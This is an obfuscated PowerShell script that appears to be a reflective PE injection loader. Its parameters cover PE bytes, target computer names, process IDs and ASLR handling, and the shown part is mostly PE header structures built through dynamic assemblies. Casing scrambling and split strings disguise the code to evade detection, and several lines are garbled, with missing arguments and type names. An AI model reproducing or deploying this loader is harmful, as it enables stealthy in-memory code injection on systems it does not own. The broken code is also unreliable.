$I7KUHX  =[tYpe]'SysteM.RuNtiME.intEropseRvIces.mARshALAsATtrIbuTE' ;   &'sET-iTeM'  'VAriAbLE:cF84' 'System.Runtime.InteropServices.UnmanagedType';  $7eq=  [tyPe]'INT32'  ;    &'sET' tIAfhC  'System.Boolean'  ; &'sET-VARIaBLE' kM5l 'System.UInt32'  ;    $XD1h =[TYpE]'BItcoNVErtEr';    &'sET-Item' 'VaRIABLE:Rbh0'  'System.Reflection.Emit.AssemblyBuilderAccess'  ; $eGj7  =  [tyPe]'aPPDOmaiN';&'SeT-itEM' VAriablE:tg58U 'System.Reflection.CallingConventions';  &'SeT-iTEm'  variablE:urYi12 'System.Environment' ;  $9hRwNy  =  [tYpE]'uIntptR' ;&'SeT-item' 'VARIABLe:63Y'  'System.Math' ;  $MlHiT=[typE]'syStEm.RunTIme.iNteROpSeRvIcEs.mArsHAl';&'SET' T2NGf  'System.IntPtr' ;$j1v  =[tyPe]'CoNveRt' ; function iNVokE-rFBuxmEHAEmZbhI
 {
 
 [CmdletBinding()]
 Param(
     [Parameter(POsitION = 0, MANdAToRy = ${TRue})]
     [ValidateNotNullOrEmpty()]
     [Byte[]]
     ${pEbYTEs},
 
  [Parameter(PoSITIoN = 1)]
  [String[]]
  ${ComputErNAMe},
 
  [Parameter(position = 2)]
     [ValidateSet({"{2}{0}{1}" -f'Strin','g','W'}, {"{1}{2}{0}" -f'ing','S','tr'}, {"{0}{1}" -f 'Voi','d'})]
  [String]
  ${FUNCReTuRntYpe} = 'Void',
 
  [Parameter(poSitIoN = 3)]
  [String]
  ${eXeArgS},
 
  [Parameter(pOsitIOn = 4)]
  [Int32]
  ${pRoCID},
 
  [Parameter(PoSiTIoN = 5)]
  [String]
  ${pRoCNAme},
 
     [Switch]
     ${FOrceasLR},
 
  [Switch]
  ${DOnOTzEroMZ}
)
 
 &'Set-StrictMode' -Version 2
 
 
 ${RemOTESCRipTbLOCk} = {
  [CmdletBinding()]
  Param(
   [Parameter(PoSITion = 0, MandaTORY = ${TRUe})]
   [Byte[]]
   ${pEByTes},
 
   [Parameter(PosITiON = 1, MANdAToRY = ${TRuE})]
   [String]
   ${fUNcRETurNtYpE},
 
   [Parameter(pOsiTiOn = 2, mANDAtORY = ${TRUE})]
   [Int32]
   ${pROciD},
 
   [Parameter(pOsITiON = 3, MAndAtoRY = ${TRUe})]
   [String]
   ${ProcNamE},
 
         [Parameter(POSitIOn = 4, MaNDATOry = ${TRUe})]
         [Bool]
         ${foRCeAsLr}
)
 
  Function GeT-wIN32TyPES
  {
   ${wIN32TYpes} = &'New-Object' 'System.Object'
 
   ${doMaIn} =   (&('gI') VaRIABlE:egJ7).value::"CUrrENTDOMain"
   ${dYnAmiCAsseMBly} = &'New-Object' 'System.Reflection.AssemblyName''DynamicAssembly'
   ${aSSemBLYBUIlDEr} = ${dOMaiN}."deFiNEDYNAMICASsEMBly"' '
   ${mODULeBUIldER} = ${assemBlYbUiLdEr}.'DefineDynamicModule'.Invoke'DynamicModule False'
   ${constRUCToRINFo} =   (&'gEt-CHilDitEM'  'variAble:i7kUhx').valUe.'GetConstructors'.Invoke()[0]
 
   ${tyPeBuILDEr} = ${MOdulEBUiLdeR}.'DefineEnum'.Invoke'MachineType Public System.UInt16'
   ${TyPEBuILder}.'DefineLiteral'.Invoke'Native 0' | &'Out-Null'
   ${TypebUilDer}.'DefineLiteral'.Invoke'I386 332' | &'Out-Null'
   ${TYpeBuIlDEr}.'DefineLiteral'.Invoke'Itanium 512' | &'Out-Null'
   ${typEBuILDER}."DefinElITERAl"'x64 34404' | &'Out-Null'
   ${mAChINetYpE} = ${tyPeBuIldEr}.'CreateType'.Invoke()
   ${Win32TypeS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'MachineType' -Value ${MAchineTYpE}
 
 
   ${tYPebUILDEr} = ${MOdULebuIldEr}.'DefineEnum'.Invoke'MagicType Public System.UInt16'
   ${tyPeBUILdEr}.'DefineLiteral'.Invoke'IMAGE_NT_OPTIONAL_HDR32_MAGIC 267' | &'Out-Null'
   ${TyPEbUILDer}.'DefineLiteral'.Invoke'IMAGE_NT_OPTIONAL_HDR64_MAGIC 523' | &'Out-Null'
   ${MagicType} = ${tYPEBuIlDer}.'CreateType'.Invoke()
   ${WiN32tyPeS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'MagicType' -Value ${MAgicTYPE}
 
 
   ${tyPEBUiLdEr} = ${MOdULEbUiLDer}.'DefineEnum'.Invoke'SubSystemType Public System.UInt16'
   ${TyPebUILdEr}.'DefineLiteral'.Invoke'IMAGE_SUBSYSTEM_UNKNOWN 0' | &'Out-Null'
   ${typeBUilder}.'DefineLiteral'.Invoke'IMAGE_SUBSYSTEM_NATIVE 1' | &'Out-Null'
   ${TypebuiLdeR}.'DefineLiteral'.Invoke'IMAGE_SUBSYSTEM_WINDOWS_GUI 2' | &'Out-Null'
   ${tYPeBuiLDeR}.'DefineLiteral'.Invoke'IMAGE_SUBSYSTEM_WINDOWS_CUI 3' | &'Out-Null'
   ${typeBUiLDeR}.'DefineLiteral'.Invoke'IMAGE_SUBSYSTEM_POSIX_CUI 7' | &'Out-Null'
   ${typeBUILdeR}.'DefineLiteral'.Invoke'IMAGE_SUBSYSTEM_WINDOWS_CE_GUI 9' | &'Out-Null'
   ${tyPebUiLDER}.'DefineLiteral'.Invoke'IMAGE_SUBSYSTEM_EFI_APPLICATION 10' | &'Out-Null'
   ${tYpeBuILder}.'DefineLiteral'.Invoke'IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER 11' | &'Out-Null'
   ${TypeBUilDER}.'DefineLiteral'.Invoke'IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER 12' | &'Out-Null'
   ${tYPEBUIldeR}.'DefineLiteral'.Invoke'IMAGE_SUBSYSTEM_EFI_ROM 13' | &'Out-Null'
   ${TyPeBuILDEr}.'DefineLiteral'.Invoke'IMAGE_SUBSYSTEM_XBOX 14' | &'Out-Null'
   ${SUbsYSteMTyPE} = ${typEBuilDER}.'CreateType'.Invoke()
   ${wIN32TYPeS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'SubSystemType' -Value ${SUbsYsTEmtYpe}
 
 
   ${TyPeBUildER} = ${mOdULEBUilDEr}.'DefineEnum'.Invoke'DllCharacteristicsType Public System.UInt16'
   ${tYpeBUIlder}.'DefineLiteral'.Invoke'RES_0 1' | &'Out-Null'
   ${TYPEbUilDer}.'DefineLiteral'.Invoke'RES_1 2' | &'Out-Null'
   ${tYPeBuILdER}.'DefineLiteral'.Invoke'RES_2 4' | &'Out-Null'
   ${TypebUildER}.'DefineLiteral'.Invoke'RES_3 8' | &'Out-Null'
   ${TYPEBUildeR}.'DefineLiteral'.Invoke'IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE 64' | &'Out-Null'
   ${tyPEbuILdER}.'DefineLiteral'.Invoke'IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY 128' | &'Out-Null'
   ${typeBUIldEr}.'DefineLiteral'.Invoke'IMAGE_DLL_CHARACTERISTICS_NX_COMPAT 256' | &'Out-Null'
   ${TyPebUILdeR}.'DefineLiteral'.Invoke'IMAGE_DLLCHARACTERISTICS_NO_ISOLATION 512' | &'Out-Null'
   ${tYpeBUiLDer}.'DefineLiteral'.Invoke'IMAGE_DLLCHARACTERISTICS_NO_SEH 1024' | &'Out-Null'
   ${typEbuIlder}.'DefineLiteral'.Invoke'IMAGE_DLLCHARACTERISTICS_NO_BIND 2048' | &'Out-Null'
   ${typeBuiLDer}.'DefineLiteral'.Invoke'RES_4 4096' | &'Out-Null'
   ${tYPeBuiLDer}.'DefineLiteral'.Invoke'IMAGE_DLLCHARACTERISTICS_WDM_DRIVER 8192' | &'Out-Null'
   ${tYPeBuiLDER}.'DefineLiteral'.Invoke'IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE 32768' | &'Out-Null'
   ${DLLchARacterIstIcstYpE} = ${tYpebUiLder}.'CreateType'.Invoke()
   ${WiN32TYpES} | &'Add-Member' -MemberType 'NoteProperty' -Name 'DllCharacteristicsType' -Value ${dLlChaRAcTERiSTICSTYpE}
 
 
 
   ${ATTRibUTes} = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
   ${tYPebUILDER} = ${ModuLeBUIlder}.'DefineType'.Invoke'IMAGE_DATA_DIRECTORY  System.ValueType 8'
   (${tyPeBUiLdeR}.'DefineField'.Invoke'VirtualAddress System.UInt32 Public').'SetOffset'.Invoke(0) | &'Out-Null'
   (${TYPEBuilDeR}.'DefineField'.Invoke'Size System.UInt32 Public').'SetOffset'.Invoke'4' | &'Out-Null'
   ${imagE_DAtA_DirecTOrY} = ${TYPEBUIldEr}.'CreateType'.Invoke()
   ${wiN32TypeS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_DATA_DIRECTORY' -Value ${imaGE_DatA_direCToRY}
 
 
   ${AtTriBUTES} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
   ${typebUIlDEr} = ${mOdULeBuilDer}.'DefineType'.Invoke'IMAGE_FILE_HEADER  System.ValueType 20'
   ${tyPeBUIlDER}.'DefineField'.Invoke'Machine System.UInt16 Public' | &'Out-Null'
   ${TYPEBuildER}.'DefineField'.Invoke'NumberOfSections System.UInt16 Public' | &'Out-Null'
   ${TyPeBuIlder}.'DefineField'.Invoke'TimeDateStamp System.UInt32 Public' | &'Out-Null'
   ${tYPeBUilDeR}.'DefineField'.Invoke'PointerToSymbolTable System.UInt32 Public' | &'Out-Null'
   ${typeBuIlDER}.'DefineField'.Invoke'NumberOfSymbols System.UInt32 Public' | &'Out-Null'
   ${TYPeBuILDEr}.'DefineField'.Invoke'SizeOfOptionalHeader System.UInt16 Public' | &'Out-Null'
   ${tYPEbuILDeR}.'DefineField'.Invoke'Characteristics System.UInt16 Public' | &'Out-Null'
   ${iMAgE_FIle_hEadER} = ${TyPEBUIlDer}.'CreateType'.Invoke()
   ${wiN32TYPeS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_FILE_HEADER' -Value ${image_filE_HeaDeR}
 
 
   ${attrIbUTeS} = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
   ${tyPEBUiLdER} = ${MoDUlEBUIldeR}.'DefineType'.Invoke'IMAGE_OPTIONAL_HEADER64  System.ValueType 240'
   (${TYPeBuilDer}.'DefineField'.Invoke'Magic  Public').'SetOffset'.Invoke(0) | &'Out-Null'
   (${tYPEbUildeR}.'DefineField'.Invoke'MajorLinkerVersion System.Byte Public').'SetOffset'.Invoke'2' | &'Out-Null'
   (${TyPEbUiLdEr}.'DefineField'.Invoke'MinorLinkerVersion System.Byte Public').'SetOffset'.Invoke'3' | &'Out-Null'
   (${TyPEbuIlDer}.'DefineField'.Invoke'SizeOfCode System.UInt32 Public').'SetOffset'.Invoke'4' | &'Out-Null'
   (${TyPEBuILDEr}.'DefineField'.Invoke'SizeOfInitializedData System.UInt32 Public').'SetOffset'.Invoke'8' | &'Out-Null'
   (${typEBUILDER}.'DefineField'.Invoke'SizeOfUninitializedData System.UInt32 Public').'SetOffset'.Invoke'12' | &'Out-Null'
   (${tYpEbuILdEr}.'DefineField'.Invoke'AddressOfEntryPoint System.UInt32 Public').'SetOffset'.Invoke'16' | &'Out-Null'
   (${tYPEBUIlDEr}.'DefineField'.Invoke'BaseOfCode System.UInt32 Public').'SetOffset'.Invoke'20' | &'Out-Null'
   (${TyPebUIlDEr}.'DefineField'.Invoke'ImageBase System.UInt64 Public').'SetOffset'.Invoke'24' | &'Out-Null'
   (${TYpEBUIldeR}.'DefineField'.Invoke'SectionAlignment System.UInt32 Public').'SetOffset'.Invoke'32' | &'Out-Null'
   (${TYpeBUILDeR}.'DefineField'.Invoke'FileAlignment System.UInt32 Public').'SetOffset'.Invoke'36' | &'Out-Null'
   (${tyPeBUIlDer}.'DefineField'.Invoke'MajorOperatingSystemVersion System.UInt16 Public').'SetOffset'.Invoke'40' | &'Out-Null'
   (${TypEBUiLDER}.'DefineField'.Invoke'MinorOperatingSystemVersion System.UInt16 Public').'SetOffset'.Invoke'42' | &'Out-Null'
   (${tyPeBUIldeR}.'DefineField'.Invoke'MajorImageVersion System.UInt16 Public').'SetOffset'.Invoke'44' | &'Out-Null'
   (${tYPeBUIlder}.'DefineField'.Invoke'MinorImageVersion System.UInt16 Public').'SetOffset'.Invoke'46' | &'Out-Null'
   (${TYPEbuIldER}.'DefineField'.Invoke'MajorSubsystemVersion System.UInt16 Public').'SetOffset'.Invoke'48' | &'Out-Null'
   (${typeBuildeR}.'DefineField'.Invoke'MinorSubsystemVersion System.UInt16 Public').'SetOffset'.Invoke'50' | &'Out-Null'
   (${TypeBuiLDer}.'DefineField'.Invoke'Win32VersionValue System.UInt32 Public').'SetOffset'.Invoke'52' | &'Out-Null'
   (${TyPEBUildEr}.'DefineField'.Invoke'SizeOfImage System.UInt32 Public').'SetOffset'.Invoke'56' | &'Out-Null'
   (${TYPEbUIlDER}.'DefineField'.Invoke'SizeOfHeaders System.UInt32 Public').'SetOffset'.Invoke'60' | &'Out-Null'
   (${TyPEBuildEr}.'DefineField'.Invoke'CheckSum System.UInt32 Public').'SetOffset'.Invoke'64' | &'Out-Null'
   (${tYpEBUiLdEr}.'DefineField'.Invoke'Subsystem  Public').'SetOffset'.Invoke'68' | &'Out-Null'
   (${TYpEbUiLDer}.'DefineField'.Invoke'DllCharacteristics  Public').'SetOffset'.Invoke'70' | &'Out-Null'
   (${TYpEBUiLdeR}.'DefineField'.Invoke'SizeOfStackReserve System.UInt64 Public').'SetOffset'.Invoke'72' | &'Out-Null'
   (${TYpeBUiLdEr}.'DefineField'.Invoke'SizeOfStackCommit System.UInt64 Public').'SetOffset'.Invoke'80' | &'Out-Null'
   (${TypEBUILDer}.'DefineField'.Invoke'SizeOfHeapReserve System.UInt64 Public').'SetOffset'.Invoke'88' | &'Out-Null'
   (${TyPeBuildER}.'DefineField'.Invoke'SizeOfHeapCommit System.UInt64 Public').'SetOffset'.Invoke'96' | &'Out-Null'
   (${TYpebUiLdER}.'DefineField'.Invoke'LoaderFlags System.UInt32 Public').'SetOffset'.Invoke'104' | &'Out-Null'
   (${tyPebUilDEr}.'DefineField'.Invoke'NumberOfRvaAndSizes System.UInt32 Public').'SetOffset'.Invoke'108' | &'Out-Null'
   (${TyPebUilDer}.'DefineField'.Invoke'ExportTable  Public').'SetOffset'.Invoke'112' | &'Out-Null'
   (${tYPebUilDeR}.'DefineField'.Invoke'ImportTable  Public').'SetOffset'.Invoke'120' | &'Out-Null'
   (${tYpEbUilDEr}.'DefineField'.Invoke'ResourceTable  Public').'SetOffset'.Invoke'128' | &'Out-Null'
   (${tYpEBUILder}.'DefineField'.Invoke'ExceptionTable  Public').'SetOffset'.Invoke'136' | &'Out-Null'
   (${TYPeBUILDEr}.'DefineField'.Invoke'CertificateTable  Public').'SetOffset'.Invoke'144' | &'Out-Null'
   (${tyPEBUILdER}.'DefineField'.Invoke'BaseRelocationTable  Public').'SetOffset'.Invoke'152' | &'Out-Null'
   (${TYPebUIldeR}.'DefineField'.Invoke'Debug  Public').'SetOffset'.Invoke'160' | &'Out-Null'
   (${tYPEBuILDER}.'DefineField'.Invoke'Architecture  Public').'SetOffset'.Invoke'168' | &'Out-Null'
   (${tyPeBuiLDER}.'DefineField'.Invoke'GlobalPtr  Public').'SetOffset'.Invoke'176' | &'Out-Null'
   (${TYPEBUiLdeR}.'DefineField'.Invoke'TLSTable  Public').'SetOffset'.Invoke'184' | &'Out-Null'
   (${TyPEbuIldEr}.'DefineField'.Invoke'LoadConfigTable  Public').'SetOffset'.Invoke'192' | &'Out-Null'
   (${tYpebUILDeR}.'DefineField'.Invoke'BoundImport  Public').'SetOffset'.Invoke'200' | &'Out-Null'
   (${typEBuiLdER}.'DefineField'.Invoke'IAT  Public').'SetOffset'.Invoke'208' | &'Out-Null'
   (${tyPEbUilDER}.'DefineField'.Invoke'DelayImportDescriptor  Public').'SetOffset'.Invoke'216' | &'Out-Null'
   (${TypeBuildEr}.'DefineField'.Invoke'CLRRuntimeHeader  Public').'SetOffset'.Invoke'224' | &'Out-Null'
   (${TypebUILdEr}.'DefineField'.Invoke'Reserved  Public').'SetOffset'.Invoke'232' | &'Out-Null'
   ${iMaGe_OPTionaL_HEadER64} = ${TYPeBuilDEr}.'CreateType'.Invoke()
   ${WIN32TypeS} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_OPTIONAL_HEADER64' -Value ${ImAgE_opTionAL_heAder64}
 
 
   ${ATtriBuTES} = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
   ${TYpeBUIlDeR} = ${mODuLEBUiLDeR}.'DefineType'.Invoke'IMAGE_OPTIONAL_HEADER32  System.ValueType 224'
   (${TYPEbUILdeR}.'DefineField'.Invoke'Magic  Public').'SetOffset'.Invoke(0) | &'Out-Null'
   (${TypEbUIlDeR}.'DefineField'.Invoke'MajorLinkerVersion System.Byte Public').'SetOffset'.Invoke'2' | &'Out-Null'
   (${tYpebUiLdER}.'DefineField'.Invoke'MinorLinkerVersion System.Byte Public').'SetOffset'.Invoke'3' | &'Out-Null'
   (${TypEBuilDEr}.'DefineField'.Invoke'SizeOfCode System.UInt32 Public').'SetOffset'.Invoke'4' | &'Out-Null'
   (${tYPebuilDEr}.'DefineField'.Invoke'SizeOfInitializedData System.UInt32 Public').'SetOffset'.Invoke'8' | &'Out-Null'
   (${TYPEBUILdER}.'DefineField'.Invoke'SizeOfUninitializedData System.UInt32 Public').'SetOffset'.Invoke'12' | &'Out-Null'
   (${TYPeBUiLDeR}.'DefineField'.Invoke'AddressOfEntryPoint System.UInt32 Public').'SetOffset'.Invoke'16' | &'Out-Null'
   (${typEBUIlDer}.'DefineField'.Invoke'BaseOfCode System.UInt32 Public').'SetOffset'.Invoke'20' | &'Out-Null'
   (${tyPeBuILder}.'DefineField'.Invoke'BaseOfData System.UInt32 Public').'SetOffset'.Invoke'24' | &'Out-Null'
   (${TyPeBuilDeR}.'DefineField'.Invoke'ImageBase System.UInt32 Public').'SetOffset'.Invoke'28' | &'Out-Null'
   (${tYPEBuIldeR}.'DefineField'.Invoke'SectionAlignment System.UInt32 Public').'SetOffset'.Invoke'32' | &'Out-Null'
   (${typeBuilDER}.'DefineField'.Invoke'FileAlignment System.UInt32 Public').'SetOffset'.Invoke'36' | &'Out-Null'
   (${tYpebUiLdEr}.'DefineField'.Invoke'MajorOperatingSystemVersion System.UInt16 Public').'SetOffset'.Invoke'40' | &'Out-Null'
   (${TYPEBuiLDer}.'DefineField'.Invoke'MinorOperatingSystemVersion System.UInt16 Public').'SetOffset'.Invoke'42' | &'Out-Null'
   (${tyPEbUIlDeR}.'DefineField'.Invoke'MajorImageVersion System.UInt16 Public').'SetOffset'.Invoke'44' | &'Out-Null'
   (${typeBuIlDEr}.'DefineField'.Invoke'MinorImageVersion System.UInt16 Public').'SetOffset'.Invoke'46' | &'Out-Null'
   (${TYPEBUiLdeR}.'DefineField'.Invoke'MajorSubsystemVersion System.UInt16 Public').'SetOffset'.Invoke'48' | &'Out-Null'
   (${tyPeBUiLDEr}.'DefineField'.Invoke'MinorSubsystemVersion System.UInt16 Public').'SetOffset'.Invoke'50' | &'Out-Null'
   (${typEbUILDeR}.'DefineField'.Invoke'Win32VersionValue System.UInt32 Public').'SetOffset'.Invoke'52' | &'Out-Null'
   (${TYpeBUilDer}.'DefineField'.Invoke'SizeOfImage System.UInt32 Public').'SetOffset'.Invoke'56' | &'Out-Null'
   (${tYPeBUILDEr}.'DefineField'.Invoke'SizeOfHeaders System.UInt32 Public').'SetOffset'.Invoke'60' | &'Out-Null'
   (${TYpebUIlDer}.'DefineField'.Invoke'CheckSum System.UInt32 Public').'SetOffset'.Invoke'64' | &'Out-Null'
   (${tYpeBUILdEr}.'DefineField'.Invoke'Subsystem  Public').'SetOffset'.Invoke'68' | &'Out-Null'
   (${tYPeBUiLdeR}.'DefineField'.Invoke'DllCharacteristics  Public').'SetOffset'.Invoke'70' | &'Out-Null'
   (${tYPEbuILdeR}.'DefineField'.Invoke'SizeOfStackReserve System.UInt32 Public').'SetOffset'.Invoke'72' | &'Out-Null'
   (${TyPEBUilder}.'DefineField'.Invoke'SizeOfStackCommit System.UInt32 Public').'SetOffset'.Invoke'76' | &'Out-Null'
   (${tyPEbUILder}.'DefineField'.Invoke'SizeOfHeapReserve System.UInt32 Public').'SetOffset'.Invoke'80' | &'Out-Null'
   (${TypeBUIlDer}.'DefineField'.Invoke'SizeOfHeapCommit System.UInt32 Public').'SetOffset'.Invoke'84' | &'Out-Null'
   (${tYPeBUiLDer}.'DefineField'.Invoke'LoaderFlags System.UInt32 Public').'SetOffset'.Invoke'88' | &'Out-Null'
   (${tyPEbuILder}.'DefineField'.Invoke'NumberOfRvaAndSizes System.UInt32 Public').'SetOffset'.Invoke'92' | &'Out-Null'
   (${TYpEBUILdEr}.'DefineField'.Invoke'ExportTable  Public').'SetOffset'.Invoke'96' | &'Out-Null'
   (${TyPEBUiLDer}.'DefineField'.Invoke'ImportTable  Public').'SetOffset'.Invoke'104' | &'Out-Null'
   (${TYpEbuiLDer}.'DefineField'.Invoke'ResourceTable  Public').'SetOffset'.Invoke'112' | &'Out-Null'
   (${tYpeBuIlDER}.'DefineField'.Invoke'ExceptionTable  Public').'SetOffset'.Invoke'120' | &'Out-Null'
   (${TyPebUiLdEr}.'DefineField'.Invoke'CertificateTable  Public').'SetOffset'.Invoke'128' | &'Out-Null'
   (${typeBuILder}.'DefineField'.Invoke'BaseRelocationTable  Public').'SetOffset'.Invoke'136' | &'Out-Null'
   (${TYPEbuIlder}.'DefineField'.Invoke'Debug  Public').'SetOffset'.Invoke'144' | &'Out-Null'
   (${TYpEBUIlDEr}.'DefineField'.Invoke'Architecture  Public').'SetOffset'.Invoke'152' | &'Out-Null'
   (${TypEBUILder}.'DefineField'.Invoke'GlobalPtr  Public').'SetOffset'.Invoke'160' | &'Out-Null'
   (${TyPEBUILder}.'DefineField'.Invoke'TLSTable  Public').'SetOffset'.Invoke'168' | &'Out-Null'
   (${TypEBUILdeR}.'DefineField'.Invoke'LoadConfigTable  Public').'SetOffset'.Invoke'176' | &'Out-Null'
   (${TyPEBUilDEr}.'DefineField'.Invoke'BoundImport  Public').'SetOffset'.Invoke'184' | &'Out-Null'
   (${TYpEBuildEr}.'DefineField'.Invoke'IAT  Public').'SetOffset'.Invoke'192' | &'Out-Null'
   (${typEBUiLdeR}.'DefineField'.Invoke'DelayImportDescriptor  Public').'SetOffset'.Invoke'200' | &'Out-Null'
   (${tyPEbUILDer}.'DefineField'.Invoke'CLRRuntimeHeader  Public').'SetOffset'.Invoke'208' | &'Out-Null'
   (${typeBUildEr}.'DefineField'.Invoke'Reserved  Public').'SetOffset'.Invoke'216' | &'Out-Null'
   ${ImAge_OpTiOnaL_HEAdER32} = ${TyPebUIlDer}.'CreateType'.Invoke()
   ${wIN32TYpes} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_OPTIONAL_HEADER32' -Value ${ImAGe_opTionAL_HeADer32}
 
 
   ${AtTRIbUtES} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
   ${tyPeBuIldEr} = ${moDULEbuilDER}.'DefineType'.Invoke'IMAGE_NT_HEADERS64  System.ValueType 264'
   ${typEBUIlDer}.'DefineField'.Invoke'Signature System.UInt32 Public' | &'Out-Null'
   ${tYpEBUILdEr}.'DefineField'.Invoke'FileHeader  Public' | &'Out-Null'
   ${tyPEBUILDer}.'DefineField'.Invoke'OptionalHeader  Public' | &'Out-Null'
   ${imAgE_nT_heADeRS64} = ${TYPEBuildeR}.'CreateType'.Invoke()
   ${Win32TypEs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_NT_HEADERS64' -Value ${iMagE_NT_heaDeRs64}
 
 
   ${aTtRiBUTes} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
   ${tYPeBUILdER} = ${moDUleBUilDEr}.'DefineType'.Invoke'IMAGE_NT_HEADERS32  System.ValueType 248'
   ${tYPEbUIlDEr}.'DefineField'.Invoke'Signature System.UInt32 Public' | &'Out-Null'
   ${TYPebuiLDEr}.'DefineField'.Invoke'FileHeader  Public' | &'Out-Null'
   ${TyPeBuiLDEr}.'DefineField'.Invoke'OptionalHeader  Public' | &'Out-Null'
   ${ImAGe_NT_HEadeRs32} = ${tyPEBuilder}.'CreateType'.Invoke()
   ${wIn32Types} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_NT_HEADERS32' -Value ${IMage_NT_HEADers32}
 
 
   ${ATTRiBuTeS} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
   ${tYpeBuilder} = ${MODUlEBuildER}.'DefineType'.Invoke'IMAGE_DOS_HEADER  System.ValueType 64'
   ${TYpEBuilDer}.'DefineField'.Invoke'e_magic System.UInt16 Public' | &'Out-Null'
   ${TypeBUILDer}.'DefineField'.Invoke'e_cblp System.UInt16 Public' | &'Out-Null'
   ${TYpEbuiLDEr}.'DefineField'.Invoke'e_cp System.UInt16 Public' | &'Out-Null'
   ${TYPEBUiLdER}.'DefineField'.Invoke'e_crlc System.UInt16 Public' | &'Out-Null'
   ${TyPEBuiLdEr}.'DefineField'.Invoke'e_cparhdr System.UInt16 Public' | &'Out-Null'
   ${TYpEBUiLDeR}.'DefineField'.Invoke'e_minalloc System.UInt16 Public' | &'Out-Null'
   ${typebUildER}.'DefineField'.Invoke'e_maxalloc System.UInt16 Public' | &'Out-Null'
   ${typEBUilDER}.'DefineField'.Invoke'e_ss System.UInt16 Public' | &'Out-Null'
   ${TyPeBuiLDer}.'DefineField'.Invoke'e_sp System.UInt16 Public' | &'Out-Null'
   ${TYPEBuILdEr}.'DefineField'.Invoke'e_csum System.UInt16 Public' | &'Out-Null'
   ${typEBuiLdEr}.'DefineField'.Invoke'e_ip System.UInt16 Public' | &'Out-Null'
   ${tYPEBuILder}.'DefineField'.Invoke'e_cs System.UInt16 Public' | &'Out-Null'
   ${TYPEBUIldeR}.'DefineField'.Invoke'e_lfarlc System.UInt16 Public' | &'Out-Null'
   ${tyPEBUiLdEr}.'DefineField'.Invoke'e_ovno System.UInt16 Public' | &'Out-Null'
 
   ${e_ResFIElD} = ${tYPEBUILDER}.'DefineField'.Invoke'e_res System.UInt16[] Public, HasFieldMarshal'
   ${ConSTRUcTORvALue} =  $Cf84::"bYVAlarRAY"
   ${FieLdaRRAY} = @($i7kuHX.'GetField'.Invoke'SizeConst')
   ${aTTrIbbuIlDer} = &'New-Object' 'System.Reflection.Emit.CustomAttributeBuilder''   System.Object[]'
   ${e_RESFIelD}.'SetCustomAttribute'.Invoke(${ATTRibBuiLder})
 
   ${typebUildeR}.'DefineField'.Invoke'e_oemid System.UInt16 Public' | &'Out-Null'
   ${tYPeBUiLDER}.'DefineField'.Invoke'e_oeminfo System.UInt16 Public' | &'Out-Null'
 
   ${e_reS2fIElD} = ${TyPeBUIldER}.'DefineField'.Invoke'e_res2 System.UInt16[] Public, HasFieldMarshal'
   ${constrUctORvALUE} =  (&'geT-VARIABle' CF84).vAlUe::"BYvALaRRaY"
   ${attRiBbUIlDeR} = &'New-Object' 'System.Reflection.Emit.CustomAttributeBuilder''   System.Object[]'
   ${e_reS2FielD}.'SetCustomAttribute'.Invoke(${AtTriBbuILDeR})
 
   ${typEBuiLDer}.'DefineField'.Invoke'e_lfanew System.Int32 Public' | &'Out-Null'
   ${iMaGe_Dos_HEADeR} = ${tyPEBUILdER}.'CreateType'.Invoke()
   ${wIn32TYPEs} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_DOS_HEADER' -Value ${IMAGE_DOS_heAdeR}
 
 
   ${aTTrIBUTes} = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
   ${tYPeBUILDER} = ${MoDulEBuiLDeR}.'DefineType'.Invoke'IMAGE_SECTION_HEADER  System.ValueType 40'
 
   ${NaMeFIEld} = ${TyPeBuiLDER}.'DefineField'.Invoke'Name System.Char[] Public, HasFieldMarshal'
   ${CoNsTrUcToRvalue} =  (&('LS')  ("V"+"aRi"+"Ab"+"LE:CF84")).VALUe::"byValaRRAy"
   ${AtTRIBBUiLDEr} = &'New-Object' 'System.Reflection.Emit.CustomAttributeBuilder''   System.Object[]'
   ${nAmEField}.'SetCustomAttribute'.Invoke(${AtTRiBbUiLdEr})
 
   ${tYPEbUiLdeR}.'DefineField'.Invoke'VirtualSize System.UInt32 Public' | &'Out-Null'
   ${tyPebUIlDeR}.'DefineField'.Invoke'VirtualAddress System.UInt32 Public' | &'Out-Null'
   ${TyPEBuIldER}.'DefineField'.Invoke'SizeOfRawData System.UInt32 Public' | &'Out-Null'
   ${TypEBuIldeR}.'DefineField'.Invoke'PointerToRawData System.UInt32 Public' | &'Out-Null'
   ${tYPEbuIlDer}.'DefineField'.Invoke'PointerToRelocations System.UInt32 Public' | &'Out-Null'
   ${tYpeBUiLder}.'DefineField'.Invoke'PointerToLinenumbers System.UInt32 Public' | &'Out-Null'
   ${TYPeBUildER}.'DefineField'.Invoke'NumberOfRelocations System.UInt16 Public' | &'Out-Null'
   ${tyPeBuildEr}.'DefineField'.Invoke'NumberOfLinenumbers System.UInt16 Public' | &'Out-Null'
   ${typebUiLDeR}.'DefineField'.Invoke'Characteristics System.UInt32 Public' | &'Out-Null'
